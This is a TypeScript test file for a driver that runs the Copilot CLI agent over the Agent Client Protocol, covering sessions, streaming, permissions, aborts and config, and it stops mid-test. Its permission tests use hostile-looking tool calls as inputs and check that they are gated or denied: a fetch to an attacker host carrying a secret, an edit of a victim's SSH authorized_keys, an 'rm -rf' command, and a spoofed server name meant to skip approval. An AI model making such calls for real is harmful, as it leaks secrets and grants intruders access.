import test from 'node:test';
import assert from 'node:assert/strict';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { CopilotDriver, copilotArgs, simpleDiff } from '../src/copilot-native';
import { Agent, ApprovalDecision, ApprovalRequest, DriverHost, EditorSnapshot, NativeTurnRequest, ProviderError, Room, SharedSkill } from '../src/types';
import { FakeChild, fakeHost, fakeSpawn, recordingSink, RecordingSink, rpcPeer, testAgent, testRoom, waitFor } from './helpers';

const AGENT_MODE = 'https://agentclientprotocol.com/protocol/session-modes#agent', PLAN_MODE = 'https://agentclientprotocol.com/protocol/session-modes#plan';
const MODES = () => ({ currentModeId: AGENT_MODE, availableModes: [{ id: AGENT_MODE, name: 'Agent' }, { id: PLAN_MODE, name: 'Plan' }, { id: 'https://agentclientprotocol.com/protocol/session-modes#autopilot', name: 'Autopilot' }] });
const CONFIG = (allowAll = true) => [
  { id: 'model', name: 'Model', category: 'model', type: 'select', currentValue: 'gpt-5-mini', options: [{ value: 'gpt-5-mini', name: 'GPT-5 mini' }, { group: 'anthropic', name: 'Anthropic', options: [{ value: 'claude-sonnet-5', name: 'Claude Sonnet 5', description: 'Balanced' }] }] },
  { id: 'reasoning_effort', name: 'Reasoning Effort', category: 'thought_level', type: 'select', currentValue: 'medium', options: ['low', 'medium', 'high', 'xhigh'].map(value => ({ value, name: value })) },
  ...(allowAll ? [{ id: 'allow_all', name: 'Allow All', type: 'select', currentValue: 'off', options: [{ value: 'off', name: 'Off' }, { value: 'on', name: 'On' }] }] : [])
];
const PERMISSION_OPTIONS = [{ optionId: 'opt-allow', name: 'Allow once', kind: 'allow_once' }, { optionId: 'opt-always', name: 'Always allow', kind: 'allow_always' }, { optionId: 'opt-deny', name: 'Deny', kind: 'reject_once' }];
type Handlers = Record<string, (params: any) => unknown>;
interface Peer { child: FakeChild; index: number; calls: { method: string; params: any }[]; rpc: ReturnType<typeof rpcPeer>; update(update: object): void }
function fakeCopilot(custom: (peer: Peer) => Handlers = () => ({}), options: { allowAll?: boolean } = {}) {
  const peers: Peer[] = [];
  const fake = fakeSpawn((child, index) => {
    const peer = { child, index, calls: [] } as unknown as Peer;
    child.onLine(m => { if (m && typeof m === 'object' && typeof m.method === 'string') peer.calls.push({ method: m.method, params: m.params }); });
    peer.update = update => peer.rpc.notify('session/update', { sessionId: `sess-${index}`, update });
    peer.rpc = rpcPeer(child, 'jsonrpc2', {
      initialize: () => ({ protocolVersion: 1, agentCapabilities: { loadSession: true }, agentInfo: { name: 'Copilot', title: 'Copilot', version: '1.0.92' }, authMethods: [{ id: 'copilot-login' }] }),
      'session/new': () => ({ sessionId: `sess-${index}`, modes: MODES(), configOptions: CONFIG(options.allowAll ?? true) }),
      'session/load': () => ({ modes: MODES(), configOptions: CONFIG(options.allowAll ?? true) }),
      'session/set_config_option': () => ({ configOptions: CONFIG(options.allowAll ?? true) }),
      'session/set_mode': () => ({}),
      'session/set_model': () => ({}),
      'session/prompt': () => { peer.update({ sessionUpdate: 'agent_message_chunk', content: { type: 'text', text: 'Hello' } }); return { stopReason: 'end_turn' }; },
      ...custom(peer)
    });
    peers.push(peer);
  });
  return { ...fake, peers };
}
const editor: EditorSnapshot = { path: join(tmpdir(), 'src', 'a.ts'), relPath: 'src/a.ts', label: 'a.ts', kind: 'text', selection: { startLine: 2, endLine: 3, text: 'const a = 1;' }, openTabs: [], key: 'k' };
function request(room: Room, agent: Agent, sink: RecordingSink, patch: Partial<NativeTurnRequest> = {}): NativeTurnRequest {
  return { room, agent, kind: 'direct', framing: 'FRAMING', context: '', fullContext: () => 'FULL HISTORY', ask: 'Do it', flags: {}, signal: new AbortController().signal, sink, ...patch };
}
function setup(custom?: (peer: Peer) => Handlers, options: { allowAll?: boolean; host?: Partial<DriverHost>; agent?: Partial<Agent> } = {}) {
  const fake = fakeCopilot(custom, options), host = fakeHost(options.host), driver = new CopilotDriver(host, fake.spawn);
  const agent = testAgent('copilot', options.agent), room = testRoom([agent]);
  return { ...fake, host, driver, agent, room };
}
const promptOf = (peer: Peer, n = 0) => peer.calls.filter(c => c.method === 'session/prompt')[n]?.params.prompt;
const method = (peer: Peer, name: string) => peer.calls.filter(c => c.method === name);
const adopt = (agent: Agent, sink: RecordingSink) => { for (const patch of sink.sessions) agent.session = { ...agent.session, ...patch }; };

test('copilotArgs: ACP flags, shared skill dirs, extra dirs and option switches', () => {
  const settings = { allowFullAccess: true, idleSessionMs: 1000, copilotUseEnvToken: false, sharedMcpServers: {} };
  const agent = testAgent('copilot', { options: { extraDirs: ['/x'], useProjectSettings: false, useMcp: false, permission: 'full' } as any });
  assert.deepEqual(copilotArgs(testAgent('copilot'), undefined, settings), ['--acp', '--no-auto-update', '--no-color', '--log-level', 'warning']);
  assert.deepEqual(copilotArgs(agent, { copilotAddDir: '/s/copilot', indexDir: '/s', codexExtraRoots: [], skills: [] }, settings, true),
    ['--acp', '--no-auto-update', '--no-color', '--log-level', 'warning', '--add-dir', '/s/copilot', '--add-dir', '/s', '--add-dir', '/x', '--no-custom-instructions', '--disable-builtin-mcps', '--allow-all']);
  assert.ok(!copilotArgs(agent, undefined, settings).includes('--allow-all'));
  assert.ok(!copilotArgs(agent, undefined, { ...settings, allowFullAccess: false }, true).includes('--allow-all'));
  assert.equal(simpleDiff('a\nold\nz', 'a\nnew\nz'), '-old\n+new');
});

test('first turn: initialize, session/new with the room MCP endpoint, framing, context, editor blocks and ask; second turn reuses the session', async () => {
  const saved = process.env.GH_TOKEN; process.env.GH_TOKEN = 'ghp_classic';
  const { driver, agent, room, peers, children, host } = setup();
  try {
    const sink = recordingSink();
    const result = await driver.turn(request(room, agent, sink, { context: '<room from="User">hi</room>', editor }));
    assert.equal(result.status, 'complete'); assert.equal(result.text, 'Hello'); assert.equal(result.usage.estimated, true);
    const peer = peers[0]!;
    assert.deepEqual(children[0]!.args.slice(0, 5), ['--acp', '--no-auto-update', '--no-color', '--log-level', 'warning']);
    assert.equal(children[0]!.env.GH_TOKEN, undefined); assert.equal(children[0]!.env.COPILOT_AUTO_UPDATE, 'false'); assert.equal(children[0]!.cwd, host.cwd());
    assert.deepEqual(method(peer, 'initialize')[0]!.params, { protocolVersion: 1, clientCapabilities: { fs: { readTextFile: false, writeTextFile: false }, terminal: false }, clientInfo: { name: 'chatroom', version: '0.4.0-test' } });
    assert.deepEqual(method(peer, 'session/new')[0]!.params, { cwd: host.cwd(), mcpServers: [{ type: 'http', name: 'chatroom', url: 'http://127.0.0.1:9/mcp', headers: [{ name: 'Authorization', value: 'Bearer test' }] }] });
    assert.deepEqual(sink.sessions[0], { id: 'sess-0', provider: 'copilot', startedAt: sink.sessions[0]!.startedAt });
    const blocks = promptOf(peer);
    assert.deepEqual(blocks[0], { type: 'text', text: 'FRAMING' }); assert.deepEqual(blocks[1], { type: 'text', text: '<room from="User">hi</room>' });
    assert.equal(blocks[2].type, 'resource_link'); assert.equal(blocks[3].type, 'resource'); assert.equal(blocks[3].resource.text, 'const a = 1;');
    assert.deepEqual(blocks.at(-1), { type: 'text', text: 'Do it' });
    adopt(agent, sink);
    const second = recordingSink();
    await driver.turn(request(room, agent, second, { ask: '', flags: { ultra: true } }));
    assert.equal(children.length, 1); assert.equal(method(peer, 'session/new').length, 1); assert.equal(method(peer, 'session/load').length, 0);
    assert.deepEqual(promptOf(peer, 1), [{ type: 'text', text: '/fleet Continue.' }]);
    assert.equal(second.sessions.filter(s => s.id).length, 0);
  } finally { await driver.dispose(); if (saved === undefined) delete process.env.GH_TOKEN; else process.env.GH_TOKEN = saved; }
});

test('session updates stream text, thinking, tool activity with diffs, plans, context and usage', async () => {
  const { driver, agent, room } = setup(peer => ({
    'session/prompt': () => {
      peer.update({ sessionUpdate: 'agent_thought_chunk', content: { type: 'text', text: 'Thinking' } });
      peer.update({ sessionUpdate: 'agent_message_chunk', content: { type: 'text', text: 'Looking.' } });
      peer.update({ sessionUpdate: 'tool_call', toolCallId: 't1', title: 'Edit a.txt', kind: 'edit', status: 'pending', locations: [{ path: 'a.txt' }], rawInput: { path: 'a.txt' } });
      peer.update({ sessionUpdate: 'tool_call_update', toolCallId: 't1', status: 'completed', content: [{ type: 'diff', path: 'a.txt', oldText: 'one\nold', newText: 'one\nnew' }] });
      peer.update({ sessionUpdate: 'tool_call', toolCallId: 't2', title: 'Running: npm test', kind: 'execute', status: 'in_progress', rawInput: { command: 'npm test' } });
      peer.update({ sessionUpdate: 'tool_call_update', toolCallId: 't2', status: 'failed', content: [{ type: 'content', content: { type: 'text', text: 'exit 1' } }] });
      peer.update({ sessionUpdate: 'agent_message_chunk', content: { type: 'text', text: 'Done.' } });
      peer.update({ sessionUpdate: 'plan', entries: [{ content: 'Read', status: 'completed' }, { content: 'Fix', status: 'in_progress' }] });
      peer.update({ sessionUpdate: 'usage_update', used: 5000, size: 100000 });
      peer.update({ sessionUpdate: 'session_info_update', title: 'ignored' });
      return { stopReason: 'end_turn', usage: { inputTokens: 100, outputTokens: 20, cachedReadTokens: 40, cachedWriteTokens: 5, totalTokens: 120 } };
    }
  }));
  try {
    const sink = recordingSink();
    const result = await driver.turn(request(room, agent, sink));
    assert.equal(result.text, 'Looking.\n\nDone.'); assert.equal(sink.texts.at(-1), 'Looking.\n\nDone.'); assert.deepEqual(sink.thinkings, ['Thinking']);
    assert.deepEqual(result.usage, { input: 100, output: 20, cached: 40, cacheWrite: 5, requests: 1, estimated: false });
    const t1 = sink.activities.filter(a => a.id === 't1');
    assert.equal(t1[0]!.status, 'running'); assert.equal(t1[0]!.kind, 'edit'); assert.equal(t1[0]!.detail, 'a.txt');
    assert.equal(t1.at(-1)!.status, 'done'); assert.equal(t1.at(-1)!.diff, '--- a.txt\n-old\n+new'); assert.equal(t1.at(-1)!.title, 'Edit a.txt');
    const t2 = sink.activities.filter(a => a.id === 't2');
    assert.equal(t2[0]!.kind, 'command'); assert.equal(t2[0]!.detail, 'npm test'); assert.equal(t2.at(-1)!.status, 'failed'); assert.equal(t2.at(-1)!.detail, 'exit 1');
    const plan = sink.activities.find(a => a.id === 'plan')!;
    assert.equal(plan.detail, '✓ Read\n→ Fix'); assert.equal(plan.status, 'running');
    assert.deepEqual(sink.sessions.find(s => s.context)?.context, { tokens: 5000, window: 100000, percent: 5 });
  } finally { await driver.dispose(); }
});

test('available commands become filtered capabilities; capabilities() reports models, efforts and supports without a prompt', async () => {
  const skills = [{ name: 'deploy-check', description: 'd', path: '/p/SKILL.md', dir: '/p', source: 'claude-project', nativeTo: ['claude', 'copilot'] }] as SharedSkill[];
  const { driver, agent, room, peers } = setup(peer => ({
    'session/new': () => {
      setTimeout(() => peer.update({ sessionUpdate: 'available_commands_update', availableCommands: [{ name: 'review', description: 'Review changes', input: { hint: '[focus]' } }, { name: 'login' }, { name: 'compact' }, { name: 'deploy-check', description: 'skill' }] }), 5);
      return { sessionId: 'sess-0', modes: MODES(), configOptions: CONFIG() };
    },
    'session/prompt': () => { peer.update({ sessionUpdate: 'current_mode_update', currentModeId: PLAN_MODE }); return { stopReason: 'end_turn' }; }
  }), { host: { skillWiring: () => ({ codexExtraRoots: [], skills }) } });
  try {
    const caps = await driver.capabilities(room, agent);
    assert.equal(caps.status, 'ready'); assert.equal(caps.version, '1.0.92'); assert.equal(caps.runtime, 'cli');
    assert.deepEqual(caps.models.map(m => m.id), ['gpt-5-mini', 'claude-sonnet-5']); assert.equal(caps.models[0]!.isDefault, true);
    assert.deepEqual(caps.efforts, ['low', 'medium', 'high', 'xhigh']); assert.equal(caps.supports.thinkHard, true); assert.equal(caps.supports.ultraTurn, true);
    assert.deepEqual(caps.mcpServers, [{ name: 'chatroom', status: 'configured' }]);
    assert.equal(method(peers[0]!, 'session/prompt').length, 0);
    await waitFor(() => driver['lives'].values().next().value?.commands);
    const sink = recordingSink();
    await driver.turn(request(room, agent, sink));
    assert.equal(method(peers[0]!, 'session/new').length, 1, 'the capabilities session is reused');
    assert.deepEqual(promptOf(peers[0]!)[0], { type: 'text', text: 'FRAMING' });
    assert.equal(sink.sessions[0]!.id, 'sess-0');
    const latest = sink.caps.at(-1)!;
    assert.deepEqual(latest.commands.map(c => c.name), ['review', 'deploy-check']);
    assert.equal(latest.commands[0]!.argumentHint, '[focus]'); assert.equal(latest.commands[1]!.source, 'skill');
    assert.deepEqual(latest.skills.map(s => s.name), ['deploy-check']);
  } finally { await driver.dispose(); }
});

test('a model the CLI lists twice (as 1.0.92 does for "auto") appears once', async () => {
  // Shape captured from the real Copilot CLI 1.0.92 session/new on an account that only has Auto.
  const model = { id: 'model', name: 'Model', category: 'model', type: 'select', currentValue: 'auto', options: [
    { value: 'auto', name: 'Auto', description: 'Let Copilot pick the best model', _meta: null },
    { value: 'auto', name: 'Auto', description: 'Auto', _meta: { copilotUsage: '1x', copilotEnablement: 'enabled' } }] };
  const { driver, agent, room } = setup(() => ({ 'session/new': () => ({ sessionId: 'sess-0', modes: MODES(), configOptions: [model] }) }));
  try {
    const caps = await driver.capabilities(room, agent);
    assert.deepEqual(caps.models.map(m => [m.id, m.name]), [['auto', 'Auto']]);
  } finally { await driver.dispose(); }
});
test('signed out: turns throw signed-out with a login action; capabilities report it without throwing; a missing CLI reports missing', async () => {
  const { driver, agent, room, children } = setup(() => ({ 'session/new': () => { throw { code: -32000, message: 'Authentication required' }; } }));
  try {
    await assert.rejects(driver.turn(request(room, agent, recordingSink())), (error: unknown) => error instanceof ProviderError && error.code === 'signed-out' && error.extra.action === 'copilotLogin' && /copilot login/.test(error.message));
    assert.ok(children[0]!.stdinEnded || children[0]!.killed, 'the signed-out process is not left running');
    const caps = await driver.capabilities(room, agent);
    assert.equal(caps.status, 'signed-out'); assert.equal(caps.action, 'copilotLogin');
  } finally { await driver.dispose(); }
  const missing = setup(undefined, { host: { runtime: async () => undefined } });
  await assert.rejects(missing.driver.turn(request(missing.room, missing.agent, recordingSink())), (error: unknown) => error instanceof ProviderError && error.code === 'missing' && error.extra.action === 'installCopilot');
  const caps = await missing.driver.capabilities(missing.room, missing.agent);
  assert.equal(caps.status, 'missing'); assert.equal(caps.action, 'installCopilot'); assert.equal(missing.children.length, 0);
});

async function permissionRound(permission: Agent['options']['permission'], toolCall: object, decide?: (r: ApprovalRequest) => ApprovalDecision, settings?: Partial<ReturnType<DriverHost['settings']>>) {
  let outcome: any;
  const { driver, agent, room } = setup(peer => ({
    'session/prompt': async (params: any) => { outcome = await peer.rpc.request('session/request_permission', { sessionId: params.sessionId, toolCall, options: PERMISSION_OPTIONS }); return { stopReason: 'end_turn' }; }
  }), { agent: { options: { permission } as any }, host: settings ? { settings: () => ({ allowFullAccess: false, idleSessionMs: 600000, copilotUseEnvToken: false, sharedMcpServers: {}, ...settings }) } : {} });
  const sink = recordingSink(decide);
  try { await driver.turn(request(room, agent, sink)); } finally { await driver.dispose(); }
  return { outcome: outcome?.outcome, approvals: sink.approvals };
}
test('request_permission: cards in ask mode, auto rules for auto-edit, plan and room tools, option ids per decision', async () => {
  const execute = { toolCallId: 'p1', kind: 'execute', title: 'Run npm test', rawInput: { command: 'npm test' } };
  const ask = await permissionRound('ask', execute, () => ({ decision: 'allow-session' }));
  assert.deepEqual(ask.outcome, { outcome: 'selected', optionId: 'opt-always' });
  assert.deepEqual(ask.approvals[0], { kind: 'command', tool: 'execute', title: 'Run npm test', canAllowSession: true, detail: JSON.stringify({ command: 'npm test' }, null, 2) });
  assert.deepEqual((await permissionRound('ask', execute, () => ({ decision: 'allow' }))).outcome, { outcome: 'selected', optionId: 'opt-allow' });
  assert.deepEqual((await permissionRound('ask', execute, () => ({ decision: 'deny' }))).outcome, { outcome: 'selected', optionId: 'opt-deny' });
  const autoEdit = await permissionRound('auto-edit', { toolCallId: 'p2', kind: 'edit', title: 'Edit a.ts', locations: [{ path: 'src/a.ts' }], rawInput: { path: 'src/a.ts' } });
  assert.deepEqual(autoEdit.outcome, { outcome: 'selected', optionId: 'opt-allow' }); assert.equal(autoEdit.approvals.length, 0);
  const autoExec = await permissionRound('auto-edit', execute, () => ({ decision: 'deny' }));
  assert.equal(autoExec.approvals.length, 1); assert.equal(autoExec.outcome.optionId, 'opt-deny');
  const plan = await permissionRound('plan', { toolCallId: 'p3', kind: 'edit', title: 'Edit a.ts' });
  assert.deepEqual(plan.outcome, { outcome: 'selected', optionId: 'opt-deny' }); assert.equal(plan.approvals.length, 0);
  assert.equal((await permissionRound('plan', { toolCallId: 'p4', kind: 'read', title: 'Read a.ts' })).approvals.length, 1);
  const room = await permissionRound('ask', { toolCallId: 'p5', kind: 'other', title: 'chatroom-search_documents', rawInput: { query: 'x' } });
  assert.equal(room.outcome.optionId, 'opt-allow'); assert.equal(room.approvals.length, 0);
  const named = await permissionRound('plan', { toolCallId: 'p7', kind: 'other', title: 'search_documents', rawInput: { query: 'x' }, _meta: { mcpServerName: 'chatroom' } });
  assert.equal(named.outcome.optionId, 'opt-allow'); assert.equal(named.approvals.length, 0);
  assert.equal((await permissionRound('ask', { toolCallId: 'p6', kind: 'execute', title: 'Running: echo chatroom search_documents' })).approvals.length, 1);
  // sandbox_run goes to Chatroom without a Copilot card: Chatroom's own approval card is the gate. Not when it is an execute call or another server's tool.
  const sandbox = await permissionRound('ask', { toolCallId: 'p8', kind: 'other', title: 'chatroom-sandbox_run', rawInput: { command: 'npm test' } });
  assert.equal(sandbox.outcome.optionId, 'opt-allow'); assert.equal(sandbox.approvals.length, 0);
  const sandboxNamed = await permissionRound('plan', { toolCallId: 'p9', kind: 'other', title: 'sandbox_run', rawInput: { command: 'ls' }, _meta: { mcpServerName: 'chatroom' } });
  assert.equal(sandboxNamed.outcome.optionId, 'opt-allow'); assert.equal(sandboxNamed.approvals.length, 0);
  assert.equal((await permissionRound('ask', { toolCallId: 'p10', kind: 'execute', title: 'chatroom-sandbox_run' }, () => ({ decision: 'deny' }))).approvals.length, 1);
  assert.equal((await permissionRound('ask', { toolCallId: 'p11', kind: 'other', title: 'sandbox_run', _meta: { mcpServerName: 'evil' } }, () => ({ decision: 'deny' }))).approvals.length, 1);
  const fullWithout = await permissionRound('full', execute, () => ({ decision: 'deny' }));
  assert.equal(fullWithout.approvals.length, 1, 'full access needs chatroom.allowFullAccess');
  const full = await permissionRound('full', execute, undefined, { allowFullAccess: true });
  assert.equal(full.approvals.length, 0); assert.equal(full.outcome.optionId, 'opt-allow');
});

test('room-tool trust never comes from the model\'s arguments; auto-edit stays inside the workspace and asks for the network', async () => {
  const merge = { toolCallId: 's1', kind: 'other', title: 'merge_pull_request', rawInput: { owner: 'o', repo: 'r', pullNumber: 1, server: 'chatroom' }, _meta: { mcpServerName: 'github-mcp-server' } };
  const spoofed = await permissionRound('plan', merge, () => ({ decision: 'deny' }));
  assert.equal(spoofed.approvals.length, 1); assert.equal(spoofed.outcome.optionId, 'opt-deny');
  const unnamed = await permissionRound('plan', { ...merge, _meta: undefined }, () => ({ decision: 'deny' }));
  assert.equal(unnamed.approvals.length, 1);
  const fetch = { toolCallId: 's2', kind: 'fetch', title: 'Fetch', rawInput: { url: 'https://attacker.example/?d=secret', serverName: 'chatroom' } };
  assert.equal((await permissionRound('ask', fetch, () => ({ decision: 'deny' }))).approvals.length, 1);
  assert.equal((await permissionRound('auto-edit', fetch, () => ({ decision: 'deny' }))).approvals.length, 1, 'auto-edit asks before network access');
  const outside = await permissionRound('auto-edit', { toolCallId: 's3', kind: 'edit', title: 'Edit authorized_keys', locations: [{ path: join(tmpdir(), '..', 'victim', '.ssh', 'authorized_keys') }] }, () => ({ decision: 'deny' }));
  assert.equal(outside.approvals.length, 1); assert.equal(outside.outcome.optionId, 'opt-deny');
  const mixed = await permissionRound('auto-edit', { toolCallId: 's4', kind: 'edit', title: 'Edit two files', locations: [{ path: 'a.ts' }, { path: '../../outside.ts' }] }, () => ({ decision: 'deny' }));
  assert.equal(mixed.approvals.length, 1);
  assert.equal((await permissionRound('auto-edit', { toolCallId: 's5', kind: 'edit', title: 'Edit' }, () => ({ decision: 'deny' }))).approvals.length, 1, 'an edit without a known path asks');
  assert.equal((await permissionRound('auto-edit', { toolCallId: 's6', kind: 'think', title: 'Thinking' })).approvals.length, 0);
});
test('ultra puts /fleet at the start of the message, with the framing and room context after it', async () => {
  const { driver, agent, room, peers } = setup();
  try {
    await driver.turn(request(room, agent, recordingSink(), { context: '<room from="Claude">ctx</room>', ask: 'Refactor the parser.', flags: { ultra: true }, editor }));
    const blocks = promptOf(peers[0]!);
    assert.deepEqual(blocks[0], { type: 'text', text: '/fleet Refactor the parser.\n\nFRAMING\n\n<room from="Claude">ctx</room>' });
    assert.equal(blocks[1].type, 'resource_link'); assert.match(blocks.at(-1).text, /^The user is viewing src\/a\.ts/);
  } finally { await driver.dispose(); }
});
test('abort sends session/cancel and resolves interrupted with the partial text; an approval pending at abort is cancelled', async () => {
  let cancelled = false, outcome: any;
  const { driver, agent, room, peers, children } = setup(peer => ({
    'session/prompt': async (params: any) => {
      peer.update({ sessionUpdate: 'agent_message_chunk', content: { type: 'text', text: 'Partial' } });
      outcome = await peer.rpc.request('session/request_permission', { sessionId: params.sessionId, toolCall: { toolCallId: 'x', kind: 'execute', title: 'rm -rf' }, options: PERMISSION_OPTIONS });
      return cancelled ? { stopReason: 'cancelled' } : undefined;
    },
    'session/cancel': () => { cancelled = true; }
  }));
  try {
    const controller = new AbortController(), sink = recordingSink(() => new Promise(() => undefined)), started = Date.now();
    const turn = driver.turn(request(room, agent, sink, { signal: controller.signal }));
    await waitFor(() => sink.approvals.length);
    controller.abort();
    const result = await turn;
    assert.equal(result.status, 'interrupted'); assert.equal(result.text, 'Partial'); assert.ok(Date.now() - started < 2000);
    assert.equal(result.delivered, true, 'the CLI answered the prompt as cancelled, so it has it');
    assert.deepEqual(method(peers[0]!, 'session/cancel')[0]!.params, { sessionId: 'sess-0' });
    assert.deepEqual(outcome, { outcome: { outcome: 'cancelled' } });
    assert.equal(children[0]!.killed, false, 'a cooperative cancel does not kill the process');
  } finally { await driver.dispose(); }
});
test('a CLI that ignores session/cancel is killed after 5 s and the turn still resolves interrupted', { timeout: 15000 }, async () => {
  const { driver, agent, room, children } = setup(() => ({ 'session/prompt': () => undefined }));
  try {
    const controller = new AbortController(), sink = recordingSink();
    const turn = driver.turn(request(room, agent, sink, { signal: controller.signal }));
    await waitFor(() => children[0]?.received.some(m => m?.method === 'session/prompt'));
    controller.abort();
    const result = await turn;
    assert.equal(result.status, 'interrupted'); assert.equal(children[0]!.killed, true);
  } finally { await driver.dispose(); }
});

test('a process exit mid-turn is a crash; the next turn respawns and loads the stored session', async () => {
  const { driver, agent, room, peers, children } = setup(peer => ({
    'session/prompt': () => { if (peer.index === 0) { peer.child.stderr('fatal: boom'); peer.child.exit(3); return undefined; } return { stopReason: 'end_turn' }; }
  }));
  try {
    const sink = recordingSink();
    await assert.rejects(driver.turn(request(room, agent, sink)), (error: unknown) => error instanceof ProviderError && error.code === 'crashed' && /code 3/.test(error.message));
    adopt(agent, sink);
    const next = recordingSink();
    await driver.turn(request(room, agent, next, { context: 'new stuff' }));
    assert.equal(children.length, 2); assert.equal(method(peers[1]!, 'session/load')[0]!.params.sessionId, 'sess-0');
    assert.deepEqual(promptOf(peers[1]!), [{ type: 'text', text: 'new stuff' }, { type: 'text', text: 'Do it' }]);
  } finally { await driver.dispose(); }
});

test('session/load ignores replayed history; a load failure starts a new session with the full room context', async () => {
  const loaded = setup(peer => ({ 'session/load': () => { peer.update({ sessionUpdate: 'agent_message_chunk', content: { type: 'text', text: 'old reply' } }); return { modes: MODES(), configOptions: CONFIG() }; } }), { agent: { session: { id: 'stored' } } });
  try {
    const sink = recordingSink();
    const result = await loaded.driver.turn(request(loaded.room, loaded.agent, sink, { context: 'delta' }));
    assert.equal(result.text, 'Hello'); assert.ok(!sink.texts.some(t => t.includes('old reply')));
    assert.deepEqual(promptOf(loaded.peers[0]!), [{ type: 'text', text: 'delta' }, { type: 'text', text: 'Do it' }]);
    assert.equal(method(loaded.peers[0]!, 'session/load')[0]!.params.mcpServers[0].name, 'chatroom');
    assert.equal(sink.sessions.length, 0);
  } finally { await loaded.driver.dispose(); }
  const lost = setup(() => ({ 'session/load': () => { throw { code: -32002, message: 'Resource not found: Session stored not found' }; } }), { agent: { session: { id: 'stored' } } });
  try {
    const sink = recordingSink();
    await lost.driver.turn(request(lost.room, lost.agent, sink, { context: 'delta' }));
    assert.deepEqual(promptOf(lost.peers[0]!).map((b: any) => b.text), ['FRAMING', 'FULL HISTORY', 'Do it']);
    assert.equal(sink.sessions[0]!.id, 'sess-0');
    assert.ok(sink.activities.some(a => a.kind === 'info' && /could not be resumed/.test(a.title)));
  } finally { await lost.driver.dispose(); }
});

test('model, effort, mode and full access are applied only when they change; think raises effort for one turn', async () => {
  const { driver, agent, room, peers } = setup(undefined, { agent: { model: 'claude-sonnet-5', options: { effort: 'high' } as any }, host: { settings: () => ({ allowFullAccess: true, idleSessionMs: 600000, copilotUseEnvToken: false, sharedMcpServers: {} }) } });
  try {
    const peer = () => peers.at(-1)!, configs = () => method(peer(), 'session/set_config_option').map(c => [c.params.configId, c.params.value]);
    let sink = recordingSink();
    await driver.turn(request(room, agent, sink)); adopt(agent, sink);
    assert.deepEqual(configs(), [['model', 'claude-sonnet-5'], ['reasoning_effort', 'high']]);
    assert.equal(method(peer(), 'session/set_mode').length, 0);
    await driver.turn(request(room, agent, recordingSink()));
    assert.equal(configs().length, 2, 'unchanged options are not re-sent');
    agent.options.effort = 'low'; agent.options.permission = 'plan';
    await driver.turn(request(room, agent, recordingSink()));
    assert.deepEqual(configs().slice(2), [['reasoning_effort', 'low']]);
    assert.deepEqual(method(peer(), 'session/set_mode').map(c => c.params), [{ sessionId: 'sess-0', modeId: PLAN_MODE }]);
    await driver.turn(request(room, agent, recordingSink(), { flags: { think: true } }));
    await waitFor(() => configs().length >= 5, 2000, 'effort restore');
    assert.deepEqual(configs().slice(3), [['reasoning_effort', 'high'], ['reasoning_effort', 'low']]);
    agent.options.permission = 'full';
    await driver.turn(request(room, agent, recordingSink()));
    assert.deepEqual(configs().slice(5), [['allow_all', 'on']]);
    assert.equal(method(peer(), 'session/set_mode').at(-1)!.params.modeId, AGENT_MODE);
    agent.options.permission = 'ask'; agent.model = '';
    await driver.turn(request(room, agent, recordingSink()));
    assert.deepEqual(configs().slice(6), [['model', 'gpt-5-mini'], ['allow_all', 'off']], 'back to the session default model and approvals');
  } finally { await driver.dispose(); }
});
test('a resumed session that still allows everything is switched back to approvals in Ask mode', async () => {
  const on = () => CONFIG().map(o => o.id === 'allow_all' ? { ...o, currentValue: 'on' } : o);
  const { driver, agent, room, peers } = setup(() => ({ 'session/load': () => ({ modes: MODES(), configOptions: on() }) }), { agent: { session: { id: 'stored' } } });
  try {
    await driver.turn(request(room, agent, recordingSink()));
    assert.deepEqual(method(peers[0]!, 'session/set_config_option').map(c => [c.params.configId, c.params.value]), [['allow_all', 'off']]);
  } finally { await driver.dispose(); }
});

test('full access without an allow_all option respawns once with --allow-all and resumes the session', async () => {
  const { driver, agent, room, peers, children } = setup(undefined, { allowAll: false, agent: { options: { permission: 'full' } as any }, host: { settings: () => ({ allowFullAccess: true, idleSessionMs: 600000, copilotUseEnvToken: false, sharedMcpServers: {} }) } });
  try {
    const sink = recordingSink();
    await driver.turn(request(room, agent, sink));
    assert.equal(children.length, 2); assert.ok(!children[0]!.args.includes('--allow-all')); assert.ok(children[1]!.args.includes('--allow-all'));
    assert.equal(method(peers[1]!, 'session/load')[0]!.params.sessionId, 'sess-0');
    assert.deepEqual(promptOf(peers[1]!)[0], { type: 'text', text: 'FRAMING' }, 'framing still goes to the new session');
    assert.deepEqual(sink.sessions.filter(s => s.id).map(s => s.id), ['sess-0']);
  } finally { await driver.dispose(); }
});

test('native commands: no session yet, /compact, known and unknown commands', async () => {
  const none = setup();
  const empty = await none.driver.turn(request(none.room, none.agent, recordingSink(), { command: { name: 'compact', args: '' } }));
  assert.equal(empty.text, 'No session yet: nothing to compact.'); assert.equal(none.children.length, 0);
  const { driver, agent, room, peers } = setup(peer => ({
    'session/load': () => { setTimeout(() => peer.update({ sessionUpdate: 'available_commands_update', availableCommands: [{ name: 'review' }, { name: 'login' }] }), 5); return { modes: MODES(), configOptions: CONFIG() }; }
  }), { agent: { session: { id: 'stored' } } });
  try {
    await driver.turn(request(room, agent, recordingSink(), { command: { name: 'compact', args: 'keep the API notes' }, context: 'ignored', editor }));
    assert.deepEqual(promptOf(peers[0]!), [{ type: 'text', text: '/compact keep the API notes' }]);
    await driver.turn(request(room, agent, recordingSink(), { command: { name: 'review', args: '' } }));
    assert.deepEqual(promptOf(peers[0]!, 1), [{ type: 'text', text: '/review' }]);
    await assert.rejects(driver.turn(request(room, agent, recordingSink(), { command: { name: 'login', args: '' } })), (error: unknown) => error instanceof ProviderError && error.code === 'unsupported');
    await assert.rejects(driver.turn(request(room, agent, recordingSink(), { command: { name: 'nope', args: '' } })), (error: unknown) => error instanceof ProviderError && error.code === 'unsupported');
    assert.equal(method(peers[0]!, 'session/set_config_option').length, 0);
  } finally { await driver.dispose(); }
});

test('shared MCP servers are passed to the session; release closes the agent process', async () => {
  const { driver, agent, room, peers, children } = setup(undefined, { host: { settings: () => ({ allowFullAccess: false, idleSessionMs: 600000, copilotUseEnvToken: true, sharedMcpServers: {
    docs: { command: 'node', args: ['server.js'], env: { TOKEN: 'x' } }, remote: { type: 'http', url: 'https://mcp.example/mcp', headers: { 'X-Key': 'k' } }, broken: {} } }) } });
  try {
    await driver.turn(request(room, agent, recordingSink()));
    assert.deepEqual(method(peers[0]!, 'session/new')[0]!.params.mcpServers.slice(1), [
      { name: 'docs', command: 'node', args: ['server.js'], env: [{ name: 'TOKEN', value: 'x' }] },
